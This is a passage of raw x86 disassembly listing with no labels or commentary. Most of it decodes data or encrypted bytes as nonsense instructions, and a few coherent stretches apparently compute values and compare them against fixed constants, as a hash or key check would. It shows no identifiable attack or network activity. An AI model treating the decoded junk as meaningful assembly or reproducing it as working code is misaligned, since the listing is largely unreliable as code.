  41aab4:	pop    edi
  41aab5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aab6:	jl     0x41aa9a
  41aab8:	jnp    0x41aa82
  41aaba:	pusha  
  41aabb:	pushf  
  41aabc:	or     al,0x59
  41aabe:	push   edx
  41aabf:	sub    BYTE PTR [edx],bl
  41aac1:	jbe    0x41aa63
  41aac3:	dec    ebp
  41aac4:	(bad)  
  41aac5:	(bad)  
  41aac6:	ret    0x6b6a
  41aac9:	and    al,0x5
  41aacb:	sbb    eax,0xcea192a5
  41aad0:	mov    al,cl
  41aad2:	jae    0x41aa7b
  41aad4:	mov    WORD PTR [esp+esi*4],?
  41aad7:	push   esp
  41aad8:	and    DWORD PTR [edx-0x16],edx
  41aadb:	or     ebp,DWORD PTR [esi]
  41aadd:	and    al,0x2
  41aadf:	pop    ebx
  41aae0:	test   bl,0x51
  41aae3:	int3   
  41aae4:	scas   eax,DWORD PTR es:[edi]
  41aae5:	pop    ss
  41aae6:	mov    bh,0x8d
  41aae8:	repz mov edi,0x3e1e2279
  41aaee:	shr    BYTE PTR [ebx],cl
  41aaf0:	xchg   esi,eax
  41aaf1:	stc    
  41aaf2:	and    BYTE PTR [esi+eax*1+0x16],dh
  41aaf6:	ds pop ss
  41aaf8:	ins    BYTE PTR es:[edi],dx
  41aaf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aafa:	add    eax,0x930c91e3
  41aaff:	into   
  41ab00:	mov    esp,0x3a2b98b3
  41ab05:	test   al,0x8b
  41ab07:	pop    esp
  41ab08:	and    al,0x34
  41ab0a:	push   ebx
  41ab0b:	push   ecx
  41ab0c:	push   edx
  41ab0d:	push   eax
  41ab0e:	call   0x422049
  41ab13:	mov    ecx,DWORD PTR [esp+0x48]
  41ab17:	mov    ebx,DWORD PTR [esp+0x4c]
  41ab1b:	push   ebx
  41ab1c:	push   ecx
  41ab1d:	push   edx
  41ab1e:	push   eax
  41ab1f:	call   0x422049
  41ab24:	mov    ecx,DWORD PTR [esp+0x50]
  41ab28:	mov    ebx,DWORD PTR [esp+0x54]
  41ab2c:	add    eax,ecx
  41ab2e:	mov    ecx,DWORD PTR [esp+0x88]
  41ab35:	adc    edx,ebx
  41ab37:	mov    ebx,DWORD PTR [esp+0x8c]
  41ab3e:	cmp    ecx,eax
  41ab40:	jne    0x41af1d
  41ab46:	cmp    ebx,edx
  41ab48:	jmp    0x41af17
  41ab4d:	xchg   esi,eax
  41ab4e:	loope  0x41ab41
  41ab50:	gs pop esi
  41ab52:	fs jp  0x41ab2f
  41ab55:	aam    0x4d
  41ab57:	imul   esi,DWORD PTR [eax+0x70a10a56],0x72
  41ab5e:	lahf   
  41ab5f:	push   ss
  41ab60:	sbb    BYTE PTR [edx+edx*1+0x17c71818],bh
  41ab67:	sub    al,0x30
  41ab69:	in     al,0x6a
  41ab6b:	fdiv   QWORD PTR [edi]
  41ab6d:	add    eax,0x47f3cb59
  41ab72:	jecxz  0x41ab37
  41ab74:	aad    0x75
  41ab76:	in     eax,0x88
  41ab78:	jo     0x41ab6a
  41ab7a:	stos   DWORD PTR es:[edi],eax
  41ab7b:	fs inc eax
  41ab7d:	adc    edx,edi
  41ab7f:	aaa    
  41ab80:	add    al,0x77
  41ab82:	xor    al,BYTE PTR [eax+0x40c6c0b4]
  41ab88:	mov    ch,0x2e
  41ab8a:	mov    edx,0x12d0c280
  41ab8f:	sub    al,0x82
  41ab91:	fcomp  QWORD PTR [edx]
  41ab93:	das    
  41ab94:	out    dx,eax
  41ab95:	jns    0x41ac14
  41ab97:	and    DWORD PTR [ebx-0x20dbd8c8],ecx
  41ab9d:	mov    bl,0xdf
  41ab9f:	inc    ebp
  41aba0:	add    DWORD PTR es:[ecx-0x17],ebx
  41aba4:	in     al,0x70
  41aba6:	pop    esi
  41aba7:	pop    es
  41aba8:	(bad)  
  41aba9:	in     eax,0x4
  41abab:	push   es
  41abac:	out    0x76,al
  41abae:	lods   al,BYTE PTR ds:[esi]
  41abaf:	mov    ss,WORD PTR [esi-0x6e]
  41abb2:	push   ebp
  41abb3:	lea    esi,[edx+ebp*4+0x20357eca]
  41abba:	nop
  41abbb:	or     DWORD PTR [ecx+0x6c74f191],esi
  41abc1:	cmp    BYTE PTR [esi+0x6f0b4c68],0x2b
  41abc8:	outs   dx,BYTE PTR cs:[esi]
  41abca:	dec    ebx
  41abcb:	(bad)  
  41abcc:	ss and edi,esi
  41abcf:	xor    esi,DWORD PTR [eax]
  41abd1:	loop   0x41abb0
  41abd3:	test   DWORD PTR [ebx],esi
  41abd5:	push   ebp
  41abd6:	and    eax,0x10c288a0
  41abdb:	xchg   esi,eax
  41abdc:	dec    edi
  41abdd:	stos   DWORD PTR es:[edi],eax
  41abde:	sub    edx,0x205b8b6d
  41abe4:	das    
  41abe5:	mov    edx,0x36d97a66
  41abea:	pop    edi
  41abeb:	pushf  
  41abec:	das    
  41abed:	mov    ds:0x538e8b76,al
  41abf2:	pop    esi
  41abf3:	sub    BYTE PTR [ecx],cl
  41abf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41abf6:	aad    0x30
  41abf8:	arpl   WORD PTR [ebp+0x1ae64453],cx
  41abfe:	xor    BYTE PTR [ebx],cl
  41ac00:	scas   al,BYTE PTR es:[edi]
  41ac01:	pop    ebp
  41ac02:	(bad)  
  41ac03:	fcmovu st,st(4)
  41ac05:	arpl   WORD PTR [ecx],si
  41ac07:	jmp    0x82e4:0xadc3c465
  41ac0e:	push   esp
  41ac0f:	fsubr  st,st(0)
  41ac11:	adc    BYTE PTR [edx],cl
  41ac13:	sub    cl,bh
  41ac15:	jo     0x41abb0
  41ac17:	mov    eax,ds:0x106c5f64
  41ac1c:	mov    ebx,0x22a7f547
  41ac21:	and    ah,BYTE PTR [ebx+0x32204bb2]
  41ac27:	xchg   bl,bl
  41ac29:	pop    esp
  41ac2a:	ret    
  41ac2b:	(bad)  
  41ac2c:	jmp    0x41abbb
  41ac2e:	push   edi
  41ac2f:	lahf   
  41ac30:	cs popa 
  41ac32:	mov    ds:0x6a04265,al
  41ac37:	sbb    BYTE PTR [edx],dh
  41ac39:	scas   eax,DWORD PTR es:[edi]
  41ac3a:	test   DWORD PTR [ebp+0x57c20e77],esp
  41ac40:	push   ecx
  41ac41:	dec    edx
  41ac42:	or     eax,DWORD PTR [edx-0x6fde62ce]
  41ac48:	dec    edx
  41ac49:	pop    esi
  41ac4a:	test   al,0x9d
  41ac4c:	xchg   BYTE PTR [edx+ebp*2],bh
  41ac4f:	adc    esp,DWORD PTR [eax-0x54]
  41ac52:	push   edi
  41ac53:	dec    ebx
  41ac55:	jge    0x41ac6b
  41ac57:	aas    
  41ac58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac59:	shl    BYTE PTR [edx-0x76],0x32
  41ac5d:	pop    edx
  41ac5e:	pop    esp
  41ac5f:	pop    edi
  41ac60:	adc    BYTE PTR [edi+0x13b6357d],ch
  41ac66:	sub    eax,0xc72ab276
  41ac6b:	jmp    FWORD PTR [esi]
  41ac6d:	ds std 
  41ac6f:	sbb    al,0x4
  41ac71:	in     eax,dx
  41ac72:	dec    eax
  41ac73:	icebp  
  41ac74:	stc    
  41ac75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac76:	pop    ss
  41ac77:	outs   dx,DWORD PTR ds:[esi]
  41ac78:	sbb    ch,ch
  41ac7a:	mov    dh,0x91
  41ac7c:	inc    ecx
  41ac7d:	mov    ch,0xf0
  41ac7f:	pusha  
  41ac80:	jg     0x41ac78
  41ac82:	sub    eax,DWORD PTR [ebx-0x67420c6d]
  41ac88:	jp     0x41ac85
  41ac8a:	add    edi,DWORD PTR [ebx-0x7f422688]
  41ac90:	mov    cl,0xbe
  41ac92:	jle    0x41ad0c
  41ac94:	pushf  
  41ac95:	push   ebp
  41ac96:	(bad)  
  41ac97:	fcom   DWORD PTR [ebx]
  41ac99:	test   al,0x4
  41ac9b:	dec    edi
  41ac9c:	mov    ds:0xbf68dba9,al
  41aca1:	jmp    0xe7f0b5d3
  41aca6:	test   DWORD PTR [ecx+0x2d],ebp
  41aca9:	ret    0x6339
  41acac:	xlat   BYTE PTR ds:[ebx]
  41acad:	dec    ebx
  41acae:	xchg   ah,bl
  41acb0:	imul   eax,DWORD PTR [edi],0xffffffbb
  41acb3:	mov    ds:0x19b2dc2,al
  41acb8:	mov    eax,DWORD PTR [edx-0x4479bd8f]
  41acbe:	daa    
  41acbf:	inc    ebx
  41acc0:	mov    ?,WORD PTR [ebx]
  41acc2:	or     BYTE PTR [eax+0x23],bl
  41acc5:	loop   0x41ac5a
  41acc7:	out    dx,eax
  41acc8:	aaa    
  41acc9:	shl    DWORD PTR [edi+eax*2-0x33ee4fb4],1
  41acd0:	push   eax
  41acd1:	sbb    eax,0x7e78eef4
  41acd6:	add    cl,BYTE PTR [esi-0x80]
  41acd9:	(bad)  
  41acda:	in     eax,0xde
  41acdc:	xchg   ebx,eax
  41acdd:	sbb    eax,0x782dbade
  41ace2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ace3:	add    ebx,DWORD PTR [esi+0x4df9ae07]
  41ace9:	add    eax,DWORD PTR [ebx+0x5f06c79c]
  41acef:	addr16 popf 
  41acf1:	and    BYTE PTR [ebx-0x1d],cl
  41acf4:	es or  ebx,esp
  41acf7:	in     eax,0x3c
  41acf9:	cli    
  41acfa:	iret   
  41acfb:	push   esi
  41acfc:	out    0x24,eax
  41acfe:	adc    ch,ah
  41ad00:	add    BYTE PTR [ebp+0x2bff8e8b],ch
  41ad06:	jo     0x41ad09
  41ad08:	dec    edi
  41ad09:	sbb    esi,DWORD PTR [eax-0x23]
  41ad0c:	xor    ah,BYTE PTR [edi]
  41ad0e:	outs   dx,BYTE PTR ds:[esi]
  41ad0f:	inc    ecx
  41ad10:	shl    DWORD PTR [ebx-0x16],cl
  41ad13:	add    BYTE PTR [ebx],0xaa
  41ad16:	sbb    al,BYTE PTR [ecx+edi*1]
  41ad19:	or     bh,BYTE PTR [ebx+0x4ae4afab]
  41ad1f:	cwde   
  41ad20:	in     eax,dx
  41ad21:	lock mov ah,0x5
  41ad24:	into   
  41ad25:	neg    BYTE PTR [ecx-0x32ccd4be]
  41ad2b:	mov    ?,edx
  41ad2d:	jmp    DWORD PTR [esi+eiz*4-0x6902ed2f]
  41ad34:	js     0x41acca
  41ad36:	fsub   st,st(5)
  41ad38:	jne    0x41ad2a
  41ad3a:	or     edi,DWORD PTR [eax]
  41ad3c:	cwde   
  41ad3d:	mov    ds:0xae1343c5,eax
  41ad42:	shl    bh,1
  41ad44:	in     eax,dx
  41ad45:	(bad)  
  41ad47:	mov    al,ds:0x5e66767a
  41ad4c:	xchg   ecx,eax
  41ad4d:	test   DWORD PTR [esi+ecx*2+0x60959b7b],edx
  41ad54:	jmp    0x4b73742
  41ad59:	icebp  
  41ad5a:	pop    esp
  41ad5b:	mov    al,ds:0x406eaddc
  41ad60:	adc    ebx,eax
  41ad62:	adc    DWORD PTR [esi+eiz*4-0x78135b87],ecx
  41ad69:	inc    edi
  41ad6a:	lahf   
  41ad6b:	in     al,dx
  41ad6c:	add    eax,0x87b42861
  41ad71:	sub    al,0xa6
  41ad73:	jmp    FWORD PTR [ebx+esi*8-0x7dea8112]
  41ad7a:	push   edi
  41ad7b:	addr16 enter 0x60b2,0xf
  41ad80:	loope  0x41adc7
  41ad82:	xor    ebp,0x1f0fc7d7
  41ad88:	call   0xa1e37495
  41ad8d:	jnp    0x41adf9
  41ad8f:	stos   DWORD PTR es:[edi],eax
  41ad90:	test   al,0xe
  41ad92:	sbb    eax,0xd60c3f13
  41ad97:	(bad)  
  41ad98:	jmp    0x41ad1e
  41ad9a:	out    0xb3,eax
  41ad9c:	jle    0x41addc
  41ad9e:	mov    BYTE PTR [eax+ecx*2],ah
  41ada1:	mov    ah,0x6a
  41ada3:	aas    
  41ada4:	jno    0x41ad3e
  41ada6:	sbb    edi,DWORD PTR [edx-0x3b0f5446]
  41adac:	sti    
  41adad:	aam    0xb8
  41adaf:	and    al,0x14
  41adb1:	sub    bh,BYTE PTR [edi]
  41adb3:	push   eax
  41adb4:	push   eax
  41adb5:	inc    edi
  41adb6:	inc    ebp
  41adb7:	dec    esi
  41adb8:	add    bh,BYTE PTR ds:0x5e5be934
  41adbe:	int3   
  41adbf:	cld    
  41adc0:	fnstenv [edx+0x837a81e]
  41adc6:	or     dl,BYTE PTR [ecx+0xd]
  41adc9:	es push es
  41adcb:	pop    ss
  41adcc:	jmp    0x41ae0d
  41adce:	(bad)  
  41adcf:	les    ecx,FWORD PTR ds:0xfc24868f
  41add6:	fmul   DWORD PTR [eax+ecx*4-0x1ef696b4]
  41addd:	lds    ecx,FWORD PTR ds:0x550812f6
  41ade3:	xor    al,0x27
  41ade5:	mov    bh,0x6c
  41ade7:	xchg   ecx,eax
  41ade8:	jo     0x41adad
  41adea:	jb     0x41ade7
  41adec:	subps  xmm3,XMMWORD PTR [ebx-0x3d]
  41adf0:	repnz push ebx
  41adf2:	hlt    
  41adf3:	shr    BYTE PTR [eax+eax*1],0xbe
  41adf7:	mov    al,0x2e
  41adf9:	outs   dx,BYTE PTR ds:[esi]
  41adfa:	pop    edx
  41adfb:	and    bl,0x1a
  41adfe:	xchg   DWORD PTR [edi+edx*1-0x53dbcc70],esp
  41ae05:	dec    esi
  41ae06:	sbb    eax,edx
  41ae08:	call   0x96be33d
  41ae0d:	pop    esi
  41ae0e:	movhps xmm6,QWORD PTR [edx+0x32]
  41ae12:	dec    ecx
  41ae13:	loope  0x41ad9e
  41ae15:	xor    al,0x53
  41ae17:	fdivr  QWORD PTR [edx+0x16858a52]
  41ae1d:	in     eax,0x97
  41ae1f:	nop
  41ae20:	push   ds
  41ae21:	fist   WORD PTR [ebx+0x0]
  41ae24:	inc    ebx
  41ae25:	scas   al,BYTE PTR es:[edi]
  41ae26:	stc    
  41ae27:	rcl    BYTE PTR [ebp+0x1030d1c1],1
  41ae2d:	cmp    cl,BYTE PTR [eax]
  41ae2f:	pusha  
  41ae30:	and    ch,BYTE PTR [esi-0x3038b4d6]
  41ae36:	test   eax,0x5c8138d
  41ae3b:	dec    eax
  41ae3c:	mov    ch,0xc9
  41ae3e:	adc    eax,0xf6669c23
  41ae43:	or     DWORD PTR [ebp+0x2a],ebx
  41ae46:	and    bh,0xeb
  41ae49:	and    edi,DWORD PTR [edx+ebx*2]
  41ae4c:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41ae4e:	fs in  eax,0xd3
  41ae51:	add    eax,0xf1b6122c
  41ae56:	add    al,bl
  41ae58:	jl     0x41aea5
  41ae5a:	shl    DWORD PTR [eax+0x62835efa],0x35
  41ae61:	cld    
  41ae62:	lea    ebx,[edi-0x25]
  41ae65:	dec    DWORD PTR [edx]
  41ae67:	mov    ah,0xd9
  41ae69:	out    dx,al
  41ae6a:	jle    0x41ae0c
  41ae6c:	mov    eax,0x1b1d2d77
  41ae71:	xlat   BYTE PTR ds:[ebx]
  41ae72:	out    dx,al
  41ae73:	add    eax,0x80d8454c
  41ae78:	out    dx,eax
  41ae79:	ja     0x41ae95
  41ae7b:	mov    ecx,0x94eb6aaf
  41ae80:	xor    DWORD PTR [eax-0x3c],edx
  41ae83:	arpl   sp,ax
  41ae85:	stos   BYTE PTR es:[edi],al
  41ae86:	int    0xc
  41ae88:	test   ecx,ecx
  41ae8a:	pop    esi
  41ae8b:	daa    
  41ae8c:	jmp    0x4ae7fa6b
  41ae91:	in     eax,0x3c
  41ae93:	mov    ds:0xdd8bac5a,al
  41ae98:	js     0x41ae57
  41ae9a:	ss push es
  41ae9c:	shl    DWORD PTR [eax],0xce
  41ae9f:	pushf  
  41aea0:	int    0x57
  41aea2:	dec    ebp
  41aea3:	popf   
  41aea4:	(bad)
  41aea7:	mov    esp,0x2ca3e39f
  41aeac:	jmp    0x1769:0xdfcd4ec6
  41aeb3:	mov    ebx,0x15ff338b
  41aeb8:	cmc    
  41aeb9:	xchg   esi,eax
  41aeba:	xchg   esp,eax
  41aebb:	scas   eax,DWORD PTR es:[edi]
  41aebc:	add    BYTE PTR [edx-0x4a7edb1b],ch
  41aec2:	mov    al,ds:0x6be48b57
  41aec7:	sbb    dl,BYTE PTR [esi]
  41aec9:	mov    ecx,DWORD PTR [ebp+0x65ed0a31]
  41aecf:	push   ecx
  41aed0:	add    BYTE PTR [edi+eiz*8+0x18bf6d78],dh
  41aed7:	mov    ?,WORD PTR [edx+0x3c]
  41aeda:	sbb    ch,al
  41aedc:	and    edi,DWORD PTR [ebp-0x388d0d9]
  41aee2:	mov    ebx,0x3a4dd2df
  41aee7:	loopne 0x41aec4
  41aee9:	push   ebp
  41aeea:	rcr    ah,0x2b
  41aeed:	xor    DWORD PTR [edi-0x27156a83],ecx
  41aef3:	dec    esi
  41aef4:	ret    
  41aef5:	repz pop ss
  41aef7:	sbb    al,0x89
  41aef9:	push   es
  41aefa:	add    DWORD PTR [eax],ebp
  41aefc:	mov    ebp,0x1eab4d06
  41af01:	(bad)  
  41af02:	lahf   
  41af03:	jge    0x41aef3
  41af05:	mov    edx,0x4ea115f8
  41af0a:	pop    ecx
  41af0b:	jle    0x41af43
  41af0d:	jg     0x41aee1
  41af0f:	mov    edx,0x5a8a686f
  41af14:	adc    dh,BYTE PTR [ebx+0x44]
  41af17:	je     0x41d921
  41af1d:	mov    eax,DWORD PTR [esp+0x40]
  41af21:	mov    edx,DWORD PTR [esp+0x18]
  41af25:	xor    ecx,ecx
  41af27:	shld   ecx,eax,0x2
  41af2b:	shl    eax,0x2
  41af2e:	mov    ebx,0xca79a575
  41af33:	mov    DWORD PTR [esp+0x10],edx
  41af37:	mov    edx,DWORD PTR [esp+0x1c]
  41af3b:	xor    eax,ebx
  41af3d:	xor    ecx,esi
  41af3f:	mov    DWORD PTR [esp+0x14],edx
  41af43:	cmp    eax,DWORD PTR [esp+0x10]
  41af47:	jne    0x41af55
  41af4d:	cmp    ecx,edx
  41af4f:	je     0x41d926
  41af55:	mov    eax,DWORD PTR [esp+0x44]
  41af59:	cmp    eax,0xa4069aaa
  41af5e:	je     0x41b750
  41af64:	mov    edx,DWORD PTR [esp+0x18]
  41af68:	mov    eax,DWORD PTR [esp+0x1c]
  41af6c:	xor    eax,esi
  41af6e:	jmp    0x41b33d
  41af73:	popa   
  41af74:	cmp    edx,ecx
  41af76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af77:	stos   DWORD PTR es:[edi],eax
  41af78:	and    bl,BYTE PTR [esi+0x3a]
  41af7b:	ins    DWORD PTR es:[edi],dx
  41af7c:	jnp    0x41af01
  41af7e:	jl     0x41afc7
  41af80:	bound  ebx,QWORD PTR [edi+0x70]
  41af83:	pop    ss
  41af84:	xchg   edi,eax
  41af85:	push   ss
  41af86:	sbb    BYTE PTR [edx+edx*1+0x32061818],bh
  41af8d:	aaa    
  41af8e:	cs ds mov eax,0xc374e144
  41af95:	sti    
  41af96:	sub    DWORD PTR [ebx-0x15e2ca91],ebp
  41af9c:	pop    eax
  41af9d:	hlt    
  41af9e:	jg     0x41af6f
  41afa0:	add    al,0x2d
  41afa2:	in     eax,0x52
  41afa4:	test   al,0x81
  41afa6:	lea    eax,[ebx-0x5e]
  41afa9:	dec    esi
  41afaa:	jbe    0x41b01f
  41afac:	mov    BYTE PTR [edx-0x47],0xe6
  41afb0:	in     al,0xdb
  41afb2:	fidivr WORD PTR ds:0xc4dc8200
  41afb8:	aad    0x39
  41afba:	mov    eax,ds:0xd92315f7
  41afbf:	pop    ebp
  41afc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41afc1:	mov    ebx,0x63687ec4
  41afc6:	not    BYTE PTR [edx]
  41afc8:	jle    0x41afcc
  41afca:	mov    ebx,0x8ad42bf2
  41afcf:	enter  0x4ccf,0x4d
  41afd3:	gs int3 
  41afd5:	hlt    
  41afd6:	(bad)  
  41afd7:	pop    ebp
  41afd8:	jno    0x41b03f
  41afda:	push   ecx
  41afdb:	xlat   BYTE PTR ds:[ebx]
  41afdc:	lods   eax,DWORD PTR ds:[esi]
  41afdd:	dec    eax
  41afde:	pusha  
  41afdf:	in     al,0xea
  41afe1:	outs   dx,DWORD PTR ds:[esi]
  41afe2:	xchg   BYTE PTR [edx],ch
  41afe4:	sti    
  41afe5:	gs adc esi,edi
  41afe8:	inc    esp
  41afe9:	repz push esp
  41afeb:	cmp    DWORD PTR [edi-0x59],ebp
  41afee:	jge    0x41afaf
  41aff0:	popw   ss
  41aff2:	or     BYTE PTR ss:[edi+esi*2+0xe],cl
  41aff7:	mov    esp,0x9bf676b3
  41affc:	push   ds
  41affd:	stos   BYTE PTR es:[edi],al
  41affe:	dec    ebp
  41afff:	push   esp
  41b000:	popa   
  41b001:	lds    esi,FWORD PTR [edx-0x1b]
  41b004:	xchg   ebx,eax
  41b005:	mov    ch,0x1d
  41b007:	mov    eax,0xa8fd0665
  41b00c:	pushf  
  41b00d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b00e:	cli    
  41b00f:	aad    0xcb
  41b011:	or     eax,0xc0d5aa99
  41b016:	hlt    
  41b017:	lock pop ds
  41b019:	loope  0x41b04c
  41b01b:	xchg   edx,eax
  41b01c:	and    bh,BYTE PTR [ebx]
  41b01e:	pop    ebp
  41b01f:	lahf   
  41b020:	jae    0x41afce
  41b022:	xlat   BYTE PTR ds:[ebx]
  41b023:	cmp    cl,BYTE PTR [ebx-0x3a19ff4f]
  41b029:	xchg   edx,eax
  41b02a:	retf   0x60e6
  41b02d:	mov    al,ds:0x4c91ae34
  41b032:	xchg   ebp,eax
  41b033:	je     0x41afff
  41b035:	cmp    esp,DWORD PTR [ebx+eiz*8]
  41b038:	icebp  
  41b039:	inc    edx
  41b03a:	xchg   edx,eax
  41b03b:	inc    ebx
  41b03c:	mov    eax,DWORD PTR [edx-0x2c81bba4]
  41b042:	or     al,0xcb
  41b044:	jno    0x41b088
  41b046:	in     al,0x4c
  41b048:	hlt    
  41b049:	scas   al,BYTE PTR es:[edi]
  41b04a:	fstp   QWORD PTR [edx+ebx*2]
  41b04d:	dec    ebp
  41b04e:	fst    QWORD PTR [ecx-0x31829879]
  41b054:	or     eax,0x2736bed8
  41b059:	inc    eax
  41b05a:	das    
  41b05b:	lods   eax,DWORD PTR ds:[esi]
  41b05c:	dec    DWORD PTR [esi+0x66f73ce5]
  41b062:	popf   
  41b063:	jns    0x41b09e
  41b065:	pop    ecx
  41b066:	inc    edi
  41b067:	sbb    eax,0x62e94995
  41b06c:	test   eax,0xd035af5a
  41b071:	es popa 
  41b073:	push   ebx
  41b074:	sub    ah,BYTE PTR [ebx+0x25b35bf0]
  41b07a:	pushf  
  41b07b:	lock fbld TBYTE PTR [eax+0x41]
  41b07f:	adc    al,0x30
  41b081:	iret   
  41b082:	jne    0x41b0dd
  41b084:	dec    ebp
  41b085:	or     BYTE PTR ds:0x43700479,0xeb
  41b08c:	stos   BYTE PTR es:[edi],al
  41b08d:	pusha  
  41b08e:	add    al,0x6d
  41b090:	jae    0x41b0a7
  41b092:	dec    ebp
  41b093:	loopne 0x41b02a
  41b095:	fisttp DWORD PTR [esi+ebp*2]
  41b098:	mov    BYTE PTR [ebx+0x5],al
  41b09b:	dec    edx
  41b09c:	cwde   
  41b09d:	call   0xd78f:0x82d7348a
  41b0a4:	xchg   ebp,eax
  41b0a5:	push   ebp
  41b0a6:	sub    al,0xf8
  41b0a8:	xor    bh,dl
  41b0aa:	test   eax,0x1bef5cf1
  41b0af:	call   0xe4cf:0xe8f86acf
  41b0b6:	aas    
  41b0b7:	and    al,0x58
  41b0b9:	repz jmp 0x3716fc15
  41b0bf:	push   ss
  41b0c0:	push   ds
  41b0c1:	aaa    
  41b0c2:	rcr    esp,1
  41b0c4:	mov    esi,0x54dd438
  41b0c9:	in     eax,dx
  41b0ca:	dec    ebp
  41b0cb:	xchg   edx,eax
  41b0cc:	jno    0x41b103
  41b0ce:	ret    
  41b0cf:	sbb    BYTE PTR [eax+0x17],ah
  41b0d2:	mov    ds:0x34c151ee,al
  41b0d7:	popa   
  41b0d8:	jo     0x41b0e3
  41b0da:	jo     0x41b154
  41b0dc:	jnp    0x41b069
  41b0de:	hlt    
  41b0df:	jle    0x41b0a5
  41b0e1:	mov    esi,0xdb1043f9
  41b0e6:	inc    edi
  41b0e7:	(bad)  
  41b0e8:	xor    ch,BYTE PTR [eax+0x79]
  41b0eb:	pushf  
  41b0ec:	jg     0x41b0fe
  41b0ee:	mov    ?,WORD PTR [edx]
  41b0f0:	fs into 
  41b0f2:	pop    es
  41b0f3:	push   ecx
  41b0f4:	mov    bl,0x55
  41b0f6:	cmc    
  41b0f7:	inc    eax
  41b0f8:	lds    ebx,FWORD PTR [edi-0x56]
  41b0fb:	and    DWORD PTR [ebp-0x478baf56],esp
  41b101:	mov    edi,0x32f6a3db
  41b106:	jecxz  0x41b0cc
  41b108:	fld    QWORD PTR [edx-0x32]
  41b10b:	fisttp WORD PTR [ecx+0x6814b421]
  41b111:	stos   BYTE PTR es:[edi],al
  41b112:	jp     0x41b0b9
  41b114:	mov    ch,0x2b
  41b116:	jo     0x41b0de
  41b118:	es push ds
  41b11a:	loope  0x41b18e
  41b11c:	out    0x7b,al
  41b11e:	or     eax,0x9667e16d
  41b123:	dec    edx
  41b124:	mov    edx,0x9d2b499
  41b129:	test   DWORD PTR [ecx+0x7],eax
  41b12c:	test   eax,0x760183b
  41b131:	xor    DWORD PTR [ebp+edi*1+0x64093d75],esp
  41b138:	cmp    bl,BYTE PTR [ebp-0x66]
  41b13b:	in     al,dx
  41b13c:	cmp    eax,0x77ec192f
  41b141:	ja     0x41b110
  41b143:	test   eax,0x3a174a76
  41b148:	mov    ah,0x6d
  41b14a:	imul   ebp,DWORD PTR [ecx],0xffffff81
  41b14d:	sahf   
  41b14e:	call   0xf665c489
  41b153:	or     ebp,DWORD PTR [esi+eiz*1]
  41b156:	fldcw  WORD PTR [ebp-0x5]
  41b159:	in     al,dx
  41b15a:	mov    ecx,0xb31b7297
  41b15f:	xor    al,dh
  41b161:	mov    ds:0xc9ed1890,al
  41b166:	test   eax,0xe6f96118
  41b16b:	mov    edi,0xb878339c
  41b170:	xor    ah,BYTE PTR [ebx-0x38]
  41b173:	xchg   ebp,eax
  41b174:	jae    0x41b1a0
  41b176:	xchg   edx,eax
  41b177:	inc    ebx
  41b178:	dec    ecx
  41b179:	data16 jg 0x41b103
  41b17c:	push   ds
  41b17d:	pop    esp
  41b17e:	fwait
  41b17f:	mov    BYTE PTR [ebp+0x6a937b40],0xab
  41b186:	(bad)  
  41b187:	(bad)  
  41b188:	sub    BYTE PTR [eax-0x1debd01a],ch
  41b18e:	test   eax,0xa323070d
  41b193:	pop    esp
  41b194:	jb     0x41b191
  41b196:	(bad)  
  41b197:	push   ecx
  41b198:	shufps xmm5,XMMWORD PTR [edx+0x18b1c2a],0xcf
  41b1a0:	and    al,0x88
  41b1a2:	fmul   DWORD PTR [esi]
  41b1a4:	xor    al,0xe4
  41b1a6:	ret    
  41b1a7:	retf   0x69e
  41b1aa:	dec    esi
  41b1ab:	sub    ebx,edi
  41b1ad:	ss mov edi,0xc281feb8
  41b1b3:	dec    esi
  41b1b4:	repnz xor BYTE PTR [esi+0x4d],dl
  41b1b8:	(bad)  
  41b1b9:	pushf  
  41b1ba:	xor    DWORD PTR [edi-0x2e6bd91a],eax
  41b1c0:	mov    al,0x88
  41b1c2:	jmp    0x722c3592
  41b1c7:	xor    al,0x71
  41b1c9:	int3   
  41b1ca:	mov    ss,ecx
  41b1cc:	xlat   BYTE PTR ds:[ebx]
  41b1cd:	fimul  DWORD PTR [eax]
  41b1cf:	push   edi
  41b1d0:	bound  edi,QWORD PTR [ecx-0x66]
  41b1d3:	leave  
  41b1d4:	mov    al,0x4c
  41b1d6:	cmp    BYTE PTR [eax],al
  41b1d8:	push   edi
  41b1d9:	(bad)  
  41b1db:	loope  0x41b1bf
  41b1dd:	aas    
  41b1de:	sub    ebx,ebp
  41b1e0:	add    al,0xc9
  41b1e2:	xchg   dh,ch
  41b1e4:	bound  esp,QWORD PTR [esi+0x28]
  41b1e7:	test   eax,0x22f8a84c
  41b1ec:	daa    
  41b1ed:	mov    ecx,0x9d8d809b
  41b1f2:	mov    eax,ds:0x8c5b160d
  41b1f7:	pusha  
  41b1f8:	sub    bl,bh
  41b1fa:	inc    esi
  41b1fb:	scas   eax,DWORD PTR es:[edi]
  41b1fc:	sbb    DWORD PTR [ebx+0x15],0xc35a8ccf
  41b203:	and    ah,ch
  41b205:	or     DWORD PTR [ebx-0x308b3ebe],ecx
  41b20b:	pop    DWORD PTR [eax]
  41b20d:	or     ebp,ebp
  41b20f:	jnp    0x41b243
  41b211:	push   ds
  41b212:	sbb    cl,BYTE PTR [ebx-0x17]
  41b215:	in     eax,dx
  41b216:	mov    WORD PTR [esi+0x6c],?
  41b219:	push   ebx
  41b21a:	stos   BYTE PTR es:[edi],al
  41b21b:	loop   0x41b1fb
  41b21d:	mov    al,ds:0x4fa48df
  41b222:	aas    
  41b223:	in     eax,0xe5
  41b225:	push   edi
  41b226:	sti    
  41b227:	dec    esi
  41b228:	add    bh,bh
  41b22a:	sub    dh,BYTE PTR [esi-0x2099955c]
  41b230:	dec    esi
  41b231:	cmc    
  41b232:	dec    edi
  41b233:	in     eax,0xb0
  41b235:	and    ah,BYTE PTR [esi-0x68bbe0f1]
  41b23b:	aad    0xb2
  41b23d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b23e:	cs and al,0x9
  41b241:	pop    eax
  41b242:	mov    eax,0x3532ba7c
